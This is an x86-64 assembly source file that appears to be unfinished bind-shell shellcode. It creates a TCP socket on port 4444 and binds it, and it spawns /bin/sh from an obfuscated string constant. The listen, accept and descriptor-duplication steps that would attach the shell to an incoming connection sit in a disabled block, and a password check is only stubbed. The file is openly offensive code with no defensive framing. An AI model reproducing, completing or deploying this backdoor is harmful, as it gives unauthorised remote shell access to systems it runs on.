global _start
section .text

_start:
	mov rbp, rsp
	jmp _data	  	; Find string address

_main:
	pop r15 	  	; Keep reference to strings

; Build a server sockaddr_struct on the stack
	xor rax, rax
	push rax
	add ax, 0x5c11
	shl rax, 16
	add ax, 2
	push rax

; Create Socket	
	xor rax, rax
	mov rdx, rax
	inc rax
	mov rsi, rax	  	; SOCK_STREAM (1)
	inc rax
	mov rdi, rax	  	; AF_INET (2)
	add rax, 39	  	; syscall 41
	syscall
	cmp rax, -1
	jle _exit
	push rax 	  	; store socket id on stack

; Bind the Socket
	xor rax, rax
	add rax, 49
	mov rdi, [rbp-24]  	; socket id
	lea rsi, [rbp-16]  	; sockaddr_in struct
	mov rdx, 16	  	; sockaddr_in size
	push rdx	  	; create size val ref on stack

%if 0
	syscall
	cmp rax, -1
	jle _exit

; Listen
	xor rax, rax
	add rax, 2
	mov rsi, rax
	add rax, 48
	syscall
	cmp rax, -1
	jle _exit
	nop

_accept:			; Accept a connection
	xor rax, rax
	add rax, 43
	mov rdi, [rbp-24]  	; socket id
	lea rsi, [rbp-16] 	; sockaddr_in struct
	lea rdx, [rsp]		; pointer to sockaddr_in size
	syscall
	cmp rax, -1
	jle _exit

; Do auth stuff here

	push rax		; Store client socket id

; Duplicate I/O descriptors 
	mov r10, rax
	mov r8, 33
	mov rax, r8
	mov rdi, r10
	xor rsi, rsi
	syscall 

	mov rax, r8
	inc rsi
	syscall

	mov rax, r8
	inc rsi
	syscall

%endif ; 0

_spawn: ; Spawn shell
	xor rax, rax
	push rax
	pop rdx
	mov rbx, 0x68732f6e69622f78
	shr rbx, 8
	mov [rbp-16], rbx
	lea rdi, [rbp-16] 
	;add rdi, 8
	;push rdi
	;sub rdi, 8
	push rax
	push rdi
	mov rsi, rsp
	add rax, 59
	syscall
	nop
	
_exit:
	mov rax, 0x3c
	mov rbx, 1
	syscall	

_data:
	call _main
	prompt: db "Speak friend and enter: "
	pass:	db "password", 0xa
	good:	db "Welcome", 0xa
	bad:	db "Wrong", 0xa
	



